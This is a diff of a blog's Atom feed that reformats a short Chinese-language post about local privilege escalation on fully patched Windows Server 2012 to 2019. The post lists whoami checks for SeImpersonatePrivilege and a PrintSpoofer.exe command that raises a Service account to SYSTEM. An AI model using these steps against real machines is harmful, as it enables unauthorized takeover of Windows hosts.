@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://ygnight.xyz/"/>
-  <updated>2020-05-08T03:02:07.573Z</updated>
+  <updated>2020-05-08T03:05:21.314Z</updated>
   <id>http://ygnight.xyz/</id>
   
   <author>
@@ -21,9 +21,9 @@
     <link href="http://ygnight.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/"/>
     <id>http://ygnight.xyz/2020/05/08/pipePotato-%E6%96%B0%E5%9E%8B%E9%80%9A%E7%94%A8%E6%8F%90%E6%9D%83/</id>
     <published>2020-05-08T02:35:08.963Z</published>
-    <updated>2020-05-08T03:02:07.573Z</updated>
+    <updated>2020-05-08T03:05:21.314Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p><p>windows Server  2012，</p><p>windows Server 2016，</p><p>windows Server 2019</p><p>全补丁的情况都测试成功了。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami               #查看权限</span><br></pre></td></tr></table></figure><p><img src="0.png" srcset="/img/loading.gif" alt="0"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /priv         #查看是否具有SeImpersonatePrivilege权限</span><br></pre></td></tr></table></figure><p><img src="1.png" srcset="/img/loading.gif" alt="1"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PrintSpoofer.exe -i -c "whoami"      #查看权限是否提升为system</span><br></pre></td></tr></table></figure><p><img src="2.png" srcset="/img/loading.gif" alt="2"></p>]]></content>
+    <content type="html"><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>本地提权，对于任意windows Server 2012以上的windows  server版本(win8以上的某些windows版本也行)，从Service用户提到System 用户，在</p><p>windows Server  2012，</p><p>windows Server 2016，</p><p>windows Server 2019</p><p>全补丁的情况都测试成功了。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p>GitHub上有源码，自行编译即可</p><h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><p>cmd运行 </p><ol><li>whoami               #查看权限</li></ol><p><img src="0.png" srcset="/img/loading.gif" alt="0"></p><ol start="2"><li>whoami /priv         #查看是否具有SeImpersonatePrivilege权限</li></ol><p><img src="1.png" srcset="/img/loading.gif" alt="1"></p><ol start="3"><li>PrintSpoofer.exe -i -c “whoami”      #查看权限是否提升为system</li></ol><p><img src="2.png" srcset="/img/loading.gif" alt="2"></p>]]></content>
     
     <summary type="html">
     
